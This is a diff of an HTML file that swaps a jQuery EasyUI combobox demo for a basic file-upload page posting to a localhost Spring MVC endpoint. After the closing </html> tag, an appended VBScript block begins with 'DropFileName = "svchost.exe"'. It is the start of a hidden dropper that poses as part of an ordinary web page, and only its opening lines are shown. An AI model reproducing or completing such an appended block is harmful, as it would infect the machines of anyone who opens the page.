@@ -1,78 +1,65 @@
-<!DOCTYPE html>
 <html>
 <head>
-	<meta charset="UTF-8">
-	<title>Navigate ComboBox - jQuery EasyUI Demo</title>
-	<link rel="stylesheet" type="text/css" href="../../themes/default/easyui.css">
-	<link rel="stylesheet" type="text/css" href="../../themes/icon.css">
-	<link rel="stylesheet" type="text/css" href="../demo.css">
-	<script type="text/javascript" src="../../jquery.min.js"></script>
-	<script type="text/javascript" src="../../jquery.easyui.min.js"></script>
+    <title>Upload a file please</title>
+    <meta charset="utf-8">
+    <script type="text/javascript" src="easyui/jquery.min.js"></script>
 </head>
 <body>
-	<h2>Navigate ComboBox</h2>
-	<p>Navigate through combobox items width keyboard to select an item.</p>
-	<div style="margin:20px 0;">
-		<input type="checkbox" checked onchange="$('#cc').combobox({selectOnNavigation:$(this).is(':checked')})">
-		<span>SelectOnNavigation</span>
-	</div>
-	<div class="easyui-panel" style="width:100%;max-width:400px;padding:30px 60px;">
-		<div style="margin-bottom:20px">
-			<select id="cc" class="easyui-combobox" name="state" label="State:" labelPosition="top" style="width:100%;">
-				<option value="AL">Alabama</option>
-				<option value="AK">Alaska</option>
-				<option value="AZ">Arizona</option>
-				<option value="AR">Arkansas</option>
-				<option value="CA">California</option>
-				<option value="CO">Colorado</option>
-				<option value="CT">Connecticut</option>
-				<option value="DE">Delaware</option>
-				<option value="FL">Florida</option>
-				<option value="GA">Georgia</option>
-				<option value="HI">Hawaii</option>
-				<option value="ID">Idaho</option>
-				<option value="IL">Illinois</option>
-				<option value="IN">Indiana</option>
-				<option value="IA">Iowa</option>
-				<option value="KS">Kansas</option>
-				<option value="KY">Kentucky</option>
-				<option value="LA">Louisiana</option>
-				<option value="ME">Maine</option>
-				<option value="MD">Maryland</option>
-				<option value="MA">Massachusetts</option>
-				<option value="MI">Michigan</option>
-				<option value="MN">Minnesota</option>
-				<option value="MS">Mississippi</option>
-				<option value="MO">Missouri</option>
-				<option value="MT">Montana</option>
-				<option value="NE">Nebraska</option>
-				<option value="NV">Nevada</option>
-				<option value="NH">New Hampshire</option>
-				<option value="NJ">New Jersey</option>
-				<option value="NM">New Mexico</option>
-				<option value="NY">New York</option>
-				<option value="NC">North Carolina</option>
-				<option value="ND">North Dakota</option>
-				<option value="OK">Oklahoma</option>
-				<option value="OR">Oregon</option>
-				<option value="PA">Pennsylvania</option>
-				<option value="RI">Rhode Island</option>
-				<option value="SC">South Carolina</option>
-				<option value="SD">South Dakota</option>
-				<option value="TN">Tennessee</option>
-				<option value="TX">Texas</option>
-				<option value="UT">Utah</option>
-				<option value="VT">Vermont</option>
-				<option value="VA">Virginia</option>
-				<option value="WA">Washington</option>
-				<option value="WV">West Virginia</option>
-				<option value="WI">Wisconsin</option>
-				<option value="WY">Wyoming</option>
-			</select>
-		</div>
-	</div>
-	
+<h1>Please upload a file</h1>
 
+<script type="text/javascript">
+
+    function UpladFile() {
+        var fileObj = document.getElementById("file").files[0]; // js 获取文件对象
+        var FileController = "http://localhost/springmvc/upload/form";                    // 接收上传文件的后台地址
+
+        // FormData 对象
+        var form = new FormData($( "#uploadForm" )[0]);
+
+        // XMLHttpRequest 对象
+        var xhr = new XMLHttpRequest();
+        xhr.open("post", FileController, true);
+        alert("aaaa");
+        xhr.onload = function () {
+             alert("上传完成!");
+        };
+
+        xhr.upload.addEventListener("progress", progressFunction, false);
+        xhr.send(form);
+    }
+
+    function progressFunction(evt) {
+        var progressBar = document.getElementById("progressBar");
+        var percentageDiv = document.getElementById("percentage");
+        if (evt.lengthComputable) {
+            progressBar.max = evt.total;
+            progressBar.value = evt.loaded;
+            percentageDiv.innerHTML = Math.round(evt.loaded / evt.total * 100) + "%";
+            if(evt.loaded==evt.total){
+                alert("上传完成100%");
+            }
+        }
+    }
+</script>
+
+<br />
+<br />
+<br />
+<br />
+
+<progress id="progressBar" value="0" max="100"></progress>
+<span id="percentage"></span>
+
+<br />
+<br />
+<br />
+<br />
+<form id= "uploadForm">
+
+    <input type="file" id="file" name="myfile" />
+    <input type="button" onclick="UpladFile()" value="上传" />
+
+</form>
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
